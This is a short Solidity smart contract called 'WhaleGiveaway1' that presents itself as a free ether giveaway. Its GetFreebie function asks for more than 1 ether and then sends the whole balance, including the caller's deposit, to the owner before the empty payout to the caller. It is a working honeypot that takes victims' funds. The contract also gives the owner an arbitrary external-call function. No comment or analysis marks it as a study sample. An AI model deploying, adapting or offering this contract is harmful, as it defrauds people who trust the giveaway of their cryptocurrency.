pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
    address public Owner;

    function WhaleGiveaway1() public {
        Owner = msg.sender;
    }

    function() public payable {}

    function GetFreebie() public payable {
        if (msg.value > 1 ether) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);
        require(adr != address(0));
        require(data.length > 0);

        bool success = adr.call.value(msg.value)(data);
        require(success);
    }
}